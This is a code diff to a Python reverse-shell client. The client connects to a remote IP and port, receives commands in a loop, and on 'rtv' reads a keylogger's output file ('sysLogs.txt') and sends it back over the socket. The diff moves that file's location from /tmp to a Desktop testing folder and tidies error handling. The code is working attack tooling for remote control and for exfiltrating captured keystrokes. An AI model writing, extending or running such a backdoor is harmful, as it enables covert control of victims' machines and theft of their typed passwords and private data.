@@ -15,7 +15,7 @@ s.connect((call_to_ip, call_to_port))
 
 while True:                                    # Loop until killed
     try:
-        command = s.recv(1024).decode("utf-8") # Catch commands being sent
+        command = s.recv(1024).decode("utf-8").strip() # Catch commands being sent
 
         if command.lower() == "exit":          # Exit program
                                                #? Might be good to add additional work hear later
@@ -43,25 +43,35 @@ while True:                                    # Loop until killed
             except Exception as e:
                 s.send(f"Unexpected error: {str(e)}\n".encode("utf-8"))
                 continue
+        
+        # elif command.startswith("clean"):
+            # 
 
         elif command.strip().lower() == "rtv":
             try:
-                tmp_dir = "/tmp"
-                os.chdir(tmp_dir)
+                # Get the user's home directory
+                user_home = os.environ.get("HOME")  # Default to /tmp if HOME is not set
+                desktopDir = os.path.join(user_home, "Desktop/testing")
 
-                tgtF = "sysLogs.txt"           # Check file validity
-                if not os.path.exists(tgtF):   #? Check for the existance of the key logger
-                                               #? If it doesn't exist run a routine to activate it
-                    s.send(b"File path for sysLogs does not exist")
+                # Navigate to Desktop
+                if os.path.exists(desktopDir):
+                    os.chdir(desktopDir)
+                else:
+                    raise FileNotFoundError(f"Directory not found: {desktopDir}")
+
+
+                tgtF = "sysLogs.txt"  # Target file to check
+                if not os.path.exists(tgtF):  # Check if the file exists
+                    s.send(f"File path for {tgtF} does not exist\n".encode("utf-8"))
                     continue
 
-                with open(tgtF, "r") as file:  # Read & Report
+
+                with open(tgtF, "r") as file:  # Read file contents
                     content = file.read()
-                s.send(content.encode("utf-8"))
+                s.send(content.encode("utf-8"))  # Send file content back
 
             except Exception as e:
                 s.send(f"Failed to rtv logs: {str(e)}\n".encode("utf-8"))
-                continue
 
         else:
             try:
@@ -80,5 +90,5 @@ while True:                                    # Loop until killed
 
 # Close connection
 s.close()
-        
+input("Press enter to continue..")        
 
